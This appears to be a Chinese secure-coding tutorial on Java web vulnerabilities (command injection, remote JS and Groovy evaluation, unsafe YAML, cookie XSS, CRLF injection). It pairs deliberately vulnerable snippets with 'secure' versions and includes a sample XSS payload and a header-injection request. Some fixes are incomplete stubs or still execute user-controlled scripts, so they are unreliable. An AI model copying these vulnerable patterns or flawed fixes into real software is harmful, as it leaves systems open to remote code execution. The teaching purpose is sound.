<h4 id="BaseCorsFilter"><a href="#BaseCorsFilter" class="headerlink" title="BaseCorsFilter"></a>BaseCorsFilter</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> *;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 由于CorsFilter和spring security冲突，所以改为下面的代码。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Order(Ordered.HIGHEST_PRECEDENCE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseCorsFilter</span> <span class="keyword">extends</span> <span class="title class_">CorsFilter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BaseCorsFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(configurationSource());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> UrlBasedCorsConfigurationSource <span class="title function_">configurationSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CorsConfiguration</span>();</span><br><span class="line">        config.setAllowCredentials(<span class="literal">true</span>);</span><br><span class="line">        config.addAllowedOrigin(<span class="string">&quot;joychou.org&quot;</span>); <span class="comment">// 不支持</span></span><br><span class="line">        config.addAllowedOrigin(<span class="string">&quot;http://test.joychou.me&quot;</span>);</span><br><span class="line">        config.addAllowedHeader(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        config.addAllowedMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">        config.addAllowedMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">UrlBasedCorsConfigurationSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlBasedCorsConfigurationSource</span>();</span><br><span class="line">        source.registerCorsConfiguration(<span class="string">&quot;/cors/sec/corsFilter&quot;</span>, config);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="Deserialize"><a href="#Deserialize" class="headerlink" title="Deserialize"></a>Deserialize</h1><p>序列化漏洞是指在应用程序中使用对象序列化（将对象转换为字节流以进行传输或存储）时，由于缺乏适当的安全措施而导致的安全风险。这种漏洞可能允许攻击者注入恶意的序列化数据，从而导致应用程序执行未经授权的操作。序列化漏洞通常涉及到不安全的反序列化实现，攻击者可以通过构造特殊的序列化数据来执行恶意代码。</p>
<h3 id="以下是序列化漏洞的一般原理和过程："><a href="#以下是序列化漏洞的一般原理和过程：" class="headerlink" title="以下是序列化漏洞的一般原理和过程："></a>以下是序列化漏洞的一般原理和过程：</h3><ol>
<li><strong>反序列化过程：</strong> 在反序列化过程中，应用程序将字节流转换回对象。这个过程涉及到读取字节流，还原对象的状态，并在内存中创建对象。</li>
<li><strong>未验证输入：</strong> 序列化漏洞通常由于未对反序列化的输入进行适当的验证和过滤而产生。攻击者可以构造恶意的序列化数据，并将其传递给应用程序，而应用程序在反序列化时没有充分验证这些输入。</li>
<li><strong>执行恶意代码：</strong> 恶意序列化数据中可能包含恶意代码，这些代码在应用程序内执行。攻击者的目标是通过这种方式执行不受信任的操作，例如执行系统命令、绕过身份验证、修改数据等。</li>
<li><strong>攻击场景：</strong> 一种常见的攻击场景是通过篡改网络通信中的序列化数据来注入恶意代码。攻击者可以利用这种漏洞来执行远程代码，绕过应用程序的安全机制。</li>
</ol>
<h3 id="防范序列化漏洞的措施包括："><a href="#防范序列化漏洞的措施包括：" class="headerlink" title="防范序列化漏洞的措施包括："></a>防范序列化漏洞的措施包括：</h3><ul>
<li><strong>验证和过滤输入：</strong> 在反序列化过程中，对输入数据进行严格的验证和过滤，确保它是合法和受信任的。可以使用白名单机制，只接受特定类型的对象。</li>
<li><strong>沙盒执行：</strong> 在反序列化时，可以考虑在沙盒环境中执行代码，以限制恶意代码的影响范围。</li>
<li><strong>安全的序列化库：</strong> 使用经过安全审查的序列化库，这些库通常会提供更好的安全性和对恶意序列化数据的防护。</li>
<li><strong>禁用不必要的序列化：</strong> 避免对不必要的对象进行序列化，减少攻击面。</li>
</ul>
<p>总体而言，序列化漏洞是一种需要谨慎处理的安全问题，因为它可能导致执行未经授权的代码。在开发和维护应用程序时，应该采取适当的安全措施，以防范和修复潜在的序列化漏洞。</p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>RCE漏洞是指远程命令执行（Remote Command Execution）漏洞，它是一种安全漏洞类型，使攻击者能够通过远程方式执行任意系统命令，从而获得未经授权的访问权限和对目标系统的控制权。</p>
<h2 id="cmd注入"><a href="#cmd注入" class="headerlink" title="cmd注入"></a>cmd注入</h2><blockquote>
<p>cmd代码注入</p>
</blockquote>
<h3 id="敏感方法"><a href="#敏感方法" class="headerlink" title="敏感方法"></a>敏感方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> run.exec(cmd);</span><br><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd);</span><br></pre></td></tr></table></figure>

<h3 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@GetMapping(&quot;/runtime/exec&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">CommandExec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">...</span><br><span class="line">                <span class="comment">//未对cmd参数进行过滤直接交给执行器执行，存在代码注入风险；</span></span><br><span class="line">                <span class="comment">//可使用ProcessBuilder.command(&quot;Str1&quot;, &quot;Str2&quot;...)来实现安全执行；</span></span><br><span class="line">                <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> run.exec(cmd);</span><br><span class="line">...</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">processBuilder</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">...</span><br><span class="line">            String[] arrCmd = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="安全代码-2"><a href="#安全代码-2" class="headerlink" title="安全代码"></a>安全代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/runtime/exec&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">CommandExec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">    <span class="comment">// 进行输入验证和过滤，确保只允许特定的命令格式</span></span><br><span class="line">    <span class="keyword">if</span> (isValidCommand(cmd)) &#123;</span><br><span class="line">	...</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">	...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 处理非法的命令输入</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid command&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="js脚本注入"><a href="#js脚本注入" class="headerlink" title="js脚本注入"></a>js脚本注入</h2><blockquote>
<p> 远程js脚本注入</p>
</blockquote>
<h3 id="敏感方法-1"><a href="#敏感方法-1" class="headerlink" title="敏感方法"></a>敏感方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ScriptEngine.eval(Str, Bindings)</span><br></pre></td></tr></table></figure>

<h3 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于它直接使用用户提供的jsurl参数来构造JavaScript代码，并通过ScriptEngine执行该代码。这可能导致以下安全问题</span></span><br><span class="line">   <span class="meta">@GetMapping(&quot;/jscmd&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// js nashorn javascript ecmascript</span></span><br><span class="line">        <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">        <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">        engine.eval(cmd, bindings);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="安全代码-3"><a href="#安全代码-3" class="headerlink" title="安全代码"></a>安全代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/jscmd&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 进行输入验证和过滤，确保只接受合法且可信的URL</span></span><br><span class="line">    <span class="keyword">if</span> (isValidUrl(jsurl)) &#123;</span><br><span class="line">        <span class="comment">// 使用安全的JavaScript引擎，如GraalVM的JavaScript引擎</span></span><br><span class="line">        <span class="type">JavaScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> createSecureJavaScriptEngine();</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(jsurl).openStream()) &#123;</span><br><span class="line">            <span class="comment">// 在沙盒环境中执行脚本</span></span><br><span class="line">            engine.eval(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 处理非法的URL输入</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid URL&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isValidUrl</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="comment">// 进行 URL 合法性验证，例如使用正则表达式或白名单机制</span></span><br><span class="line">    <span class="comment">// 返回 true 表示 URL 合法，否则返回 false</span></span><br><span class="line">    <span class="comment">// 示例：return url.matches(&quot;^https?://(www\\.)?[a-zA-Z0-9]+\\.[a-zA-Z]&#123;2,&#125;\\S*$&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> JavaScriptEngine <span class="title function_">createSecureJavaScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建安全的JavaScript引擎，如GraalVM的JavaScript引擎</span></span><br><span class="line">    <span class="comment">// 可以配置安全策略、访问限制等来提供更好的隔离和安全控制</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="yaml注入"><a href="#yaml注入" class="headerlink" title="yaml注入"></a>yaml注入</h2><h3 id="敏感方法-2"><a href="#敏感方法-2" class="headerlink" title="敏感方法"></a>敏感方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yaml.load(String)</span><br></pre></td></tr></table></figure>

<h3 id="漏洞代码-3"><a href="#漏洞代码-3" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/vuln/yarm&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">yarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="安全代码-4"><a href="#安全代码-4" class="headerlink" title="安全代码"></a>安全代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/sec/yarm&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">secYarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">	<span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>(<span class="keyword">new</span> <span class="title class_">SafeConstructor</span>());</span><br><span class="line">	y.load(content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/vuln/yarm&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">yarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="comment">// 进行输入验证和过滤，确保只接受合法且预期的YAML格式</span></span><br><span class="line">    <span class="keyword">if</span> (isValidYaml(content)) &#123;</span><br><span class="line">        <span class="comment">// 使用安全的YAML解析库，如SnakeYAML</span></span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> createSecureYamlParser();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 加载并处理YAML数据</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">data</span> <span class="operator">=</span> yaml.load(content);</span><br><span class="line">        <span class="comment">// 进一步处理数据...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 处理非法的YAML输入</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid YAML&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isValidYaml</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="comment">// 进行YAML合法性验证，例如使用正则表达式或白名单机制</span></span><br><span class="line">    <span class="comment">// 返回 true 表示YAML合法，否则返回 false</span></span><br><span class="line">    <span class="comment">// 示例：return content.matches(&quot;^[- a-zA-Z0-9]+$&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Yaml <span class="title function_">createSecureYamlParser</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建安全的YAML解析库，如SnakeYAML</span></span><br><span class="line">    <span class="comment">// 可以配置安全策略、访问限制等来提供更好的隔离和安全控制</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="groovyshell注入"><a href="#groovyshell注入" class="headerlink" title="groovyshell注入"></a>groovyshell注入</h2><h3 id="敏感方法-3"><a href="#敏感方法-3" class="headerlink" title="敏感方法"></a>敏感方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GroovyShell.evaluate(content);</span><br></pre></td></tr></table></figure>

<h3 id="漏洞代码-4"><a href="#漏洞代码-4" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;groovy&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">groovyshell</span><span class="params">(String content)</span> &#123;</span><br><span class="line">        <span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">        groovyShell.evaluate(content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="安全代码-5"><a href="#安全代码-5" class="headerlink" title="安全代码"></a>安全代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;groovy&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">groovyshell</span><span class="params">(<span class="meta">@RequestParam</span> String content)</span> &#123;</span><br><span class="line">    <span class="comment">// 验证和过滤用户输入，确保只有受信任的内容被传递给GroovyShell</span></span><br><span class="line">    <span class="keyword">if</span> (isValidContent(content)) &#123;</span><br><span class="line">        <span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">        groovyShell.evaluate(content);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 处理非法输入，可以记录日志、抛出异常或采取其他适当的措施</span></span><br><span class="line">        handleInvalidContent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isValidContent</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="comment">// 实现验证逻辑，例如检查内容是否符合预期的格式或结构</span></span><br><span class="line">    <span class="comment">// 可以使用正则表达式、白名单、黑名单等进行验证</span></span><br><span class="line">    <span class="comment">// 返回true表示内容有效，可以传递给GroovyShell；返回false表示内容无效，需要处理</span></span><br><span class="line">    <span class="comment">// 这里只是一个示例，实际情况根据具体需求进行实现</span></span><br><span class="line">    <span class="keyword">return</span> content.matches(<span class="string">&quot;[a-zA-Z0-9_]+&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h3 id="敏感方法-4"><a href="#敏感方法-4" class="headerlink" title="敏感方法"></a>敏感方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">nick</span> <span class="operator">=</span> WebUtils.getCookieValueByName(req, NICK); <span class="comment">// key code</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Cookie nick: &quot;</span> + nick;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞代码-5"><a href="#漏洞代码-5" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value = &quot;/vuln01&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">vuln01</span><span class="params">(HttpServletRequest req)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">nick</span> <span class="operator">=</span> WebUtils.getCookieValueByName(req, NICK); <span class="comment">// key code</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Cookie nick: &quot;</span> + nick;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码直接通过<code>WebUtils.getCookieValueByName</code>方法获取Cookie的值，但没有对该值进行验证。如果恶意用户能够操控Cookie的内容，可能会导致安全问题。</p>
<ul>
<li><strong>Cookie欺骗攻击：</strong> 恶意用户可能会通过伪造或修改Cookie来冒充其他用户，获取其权限或执行未经授权的操作。</li>
<li><strong>XSS（跨站脚本攻击）：</strong> 如果Cookie中包含未经转义的用户输入，攻击者可能通过注入恶意脚本来执行跨站脚本攻击。</li>
</ul>
<blockquote>
<p>XSS（跨站脚本攻击）的潜在风险主要来自于返回给浏览器的字符串拼接，尤其是在输出用户提供的数据时，如nick的值。如果nick包含恶意的脚本代码，这些脚本代码可能会在浏览器中执行，导致安全问题。</p>
<p>在这个例子中，XSS注入攻击的一个可能的方式是通过设置恶意的Cookie值，使其包含脚本代码。例如，攻击者可以通过在Cookie中设置以下值来注入脚本：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS Attack&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果<code>nick</code>的值直接在返回的字符串中使用，那么这段恶意脚本将在浏览器中执行，弹出一个对话框，从而实现XSS攻击。</p>
<p>为了防范XSS攻击，你应该对输出进行适当的转义，确保任何用户提供的数据都不会被解释为HTML或JavaScript代码。在Spring框架中，你可以使用Thymeleaf等模板引擎来进行自动转义，或者使用<code>HtmlUtils</code>类手动转义。</p>
</blockquote>
<h3 id="安全代码-6"><a href="#安全代码-6" class="headerlink" title="安全代码"></a>安全代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value = &quot;/secure&quot;)</span></span><br><span class="line">    <span class="comment">// 使用@CookieValue注解直接获取Cookie的值，并设置默认值为空字符串，通过这种方式避免直接从HttpServletRequest中获取Cookie值从而造成的安全问题；</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">secureEndpoint</span><span class="params">(<span class="meta">@CookieValue(value = NICK, defaultValue = &quot;&quot;)</span> String nick)</span> &#123;</span><br><span class="line">    <span class="comment">//isValidNick方法将对Cookie值进行验证，确保其符合预期的格式或结构；</span></span><br><span class="line">    <span class="keyword">if</span> (isValidNick(nick)) &#123;</span><br><span class="line">        <span class="comment">// 执行安全的操作，例如将Cookie值用于业务逻辑</span></span><br><span class="line">        <span class="comment">// 使用了HtmlUtils.htmlEscape方法对nick进行HTML转义，确保任何特殊字符都被转义，从而防止它们被解释为脚本。这样可以有效地防范XSS攻击。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cookie nick: &quot;</span> + HtmlUtils.htmlEscape(nick);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 处理无效的Cookie值，可以记录日志、抛出异常或者采取其他适当的措施</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid Cookie&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h1><p>CRLF漏洞（Carriage Return Line Feed漏洞）是一种安全漏洞，涉及到处理换行符（Carriage Return和Line Feed）时的不正确验证。这类漏洞通常发生在Web应用程序中，攻击者通过在用户提供的输入中插入恶意的换行符，来执行一些意外的操作或绕过一些安全控制。</p>
<p>具体来说，CRLF漏洞通常涉及到在HTTP头或其他协议头中注入换行符，从而影响到头的解析和处理。攻击者可以尝试在这些头中插入CRLF序列，以触发一些不受控制的行为。</p>
<p><em><strong>举例：http-get</strong></em></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerable-endpoint HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">User-Agent: Mozilla/5.0\r\nInjectedHeader: MaliciousPayload\r\nSet-Cookie: session=attacker-controlled\r\n\r\n</span><br></pre></td></tr></table></figure>

<ul>
<li><code>User-Agent</code>头中插入了CRF序列，成功地添加了一个名为<code>InjectedHeader</code>的恶意头，并在其中插入了<code>Set-Cookie</code>头，将<code>session</code>的值设置为<code>attacker-controlled</code>。</li>
</ul>
<p>为防范CRLF漏洞，开发者应该在处理用户输入时进行适当的验证和过滤，确保不会将未经处理的换行符插入到协议头中。此外，对于协议头的解析和处理，也应该进行严格的规范验证，以防止不正确的解析。在代码层面，可以使用一些Web安全库或框架，以减少这类漏洞的风险。</p>
